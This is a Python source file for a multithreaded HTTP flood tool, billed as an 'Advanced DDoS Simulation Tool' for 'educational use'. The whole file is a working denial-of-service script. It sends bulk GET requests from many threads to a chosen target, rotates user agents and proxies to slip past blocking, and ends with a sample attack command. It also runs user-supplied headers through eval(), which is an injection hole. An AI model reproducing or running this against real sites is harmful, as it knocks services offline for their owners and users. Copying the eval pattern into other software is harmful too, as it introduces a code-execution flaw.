import threading
import requests
import sys
import argparse
from colorama import Fore, Style, init
import random
import time
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama for colored output
init(autoreset=True)

# Banner
def banner():
    print(Fore.RED + Style.BRIGHT + """
███████╗███████╗███╗   ███╗ ██████╗ ██╗  ██╗ █████╗ ██████╗
██╔════╝██╔════╝████╗ ████║██╔════╝ ██║  ██║██╔══██╗██╔══██╗
█████╗  █████╗  ██╔████╔██║██║  ███╗███████║███████║██████╔╝
██╔══╝  ██╔══╝  ██║╚██╔╝██║██║   ██║██╔══██║██╔══██║██╔═══╝
██║     ███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║██║
╚═╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
    Advanced DDoS Simulation Tool - For Educational Use Only!
    """ + Fore.YELLOW + Style.BRIGHT + "Author: Jusot99")

# User-agent list for random selection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/52.0",
]

# Load proxies from a file
def load_proxies(proxy_file):
    try:
        with open(proxy_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[ERROR] Proxy file {proxy_file} not found.")
        sys.exit(1)

# Validate target URL
def validate_url(url):
    try:
        response = requests.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + "[INFO] Target is reachable.")
        else:
            print(Fore.YELLOW + f"[WARNING] Target returned status code {response.status_code}. Requests may be blocked.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[ERROR] Failed to reach target: {e}")
        sys.exit(1)

# Send HTTP request with random User-Agent
def send_request(url, proxies=None, custom_headers=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if custom_headers:
        headers.update(custom_headers)

    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None

    try:
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        if response.status_code == 403:
            print(Fore.RED + "[ERROR] Request blocked (403 Forbidden).")
        else:
            print(Fore.GREEN + f"[INFO] Request sent! Response code: {response.status_code}")

        # Display server response (truncated to 300 characters)
        response_body = response.text[:300] + ("..." if len(response.text) > 300 else "")
        print(Fore.CYAN + f"[RESPONSE] {response_body}")

        # Save full response to log
        save_response_to_log(url, response)
    except Exception as e:
        print(Fore.RED + f"[ERROR] Request failed: {e}")

# Save responses to a file
def save_response_to_log(url, response):
    with open("responses_log.txt", "a") as log_file:
        log_file.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write(f"URL: {url}\nStatus Code: {response.status_code}\nResponse Body:\n{response.text}\n\n{'='*80}\n")

# Thread worker to send requests in bulk
def send_requests_in_bulk(url, num_requests, proxies=None, custom_headers=None, rate=0):
    for _ in range(num_requests):
        send_request(url, proxies, custom_headers)
        time.sleep(rate)  # Delay between requests

# Launch attack using ThreadPoolExecutor
def launch_attack(url, threads, requests_per_thread, proxies=None, custom_headers=None, rate=0):
    print(Fore.YELLOW + "[INFO] Starting attack...")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(send_requests_in_bulk, url, requests_per_thread, proxies, custom_headers, rate)

    print(Fore.GREEN + "[INFO] Attack finished.")

# Help and argument parsing
def parse_args():
    parser = argparse.ArgumentParser(
        description="An Advanced Python DDoS Simulation Tool for Ethical Use Only.",
        usage="python loic.py example.com"
    )
    parser.add_argument("target", help="Target website URL (e.g., https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-r", "--requests", type=int, default=100, help="Requests per thread (default: 100)")
    parser.add_argument("-p", "--proxy-file", help="Path to proxy file for rotating proxies", default=None)
    parser.add_argument("-H", "--headers", help="Custom headers in JSON format (e.g., '{\"Header\":\"Value\"}')", default=None)
    parser.add_argument("--rate", type=float, default=0, help="Delay (in seconds) between requests per thread (default: 0)")
    parser.add_argument("-v", "--version", action="store_true", help="Display script version")
    return parser.parse_args()

# Main function
def main():
    args = parse_args()
    if args.version:
        print(Fore.CYAN + "Advanced WebDDoS Tool v5.0 - For Educational Use Only")
        sys.exit(0)

    target = args.target
    threads = args.threads
    requests_per_thread = args.requests
    rate = args.rate
    proxies = load_proxies(args.proxy_file) if args.proxy_file else None
    custom_headers = eval(args.headers) if args.headers else None

    print(Fore.BLUE + Style.BRIGHT + f"[INFO] Target: {target}")
    print(Fore.BLUE + Style.BRIGHT + f"[INFO] Threads: {threads}")
    print(Fore.BLUE + Style.BRIGHT + f"[INFO] Requests per thread: {requests_per_thread}")
    if proxies:
        print(Fore.BLUE + Style.BRIGHT + f"[INFO] Loaded {len(proxies)} proxies.")
    if custom_headers:
        print(Fore.BLUE + Style.BRIGHT + "[INFO] Custom Headers: ", custom_headers)
    if rate > 0:
        print(Fore.BLUE + f"[INFO] Rate limiting enabled: {rate} seconds between requests.")

    validate_url(target)
    launch_attack(target, threads, requests_per_thread, proxies, custom_headers, rate)

if __name__ == "__main__":
    banner()
    main()

# python loic.py https://example.com -t 20 -r 500 --rate 0.1 --proxy-file proxies.txt -H '{"User-Agent": "CustomUserAgent"}'
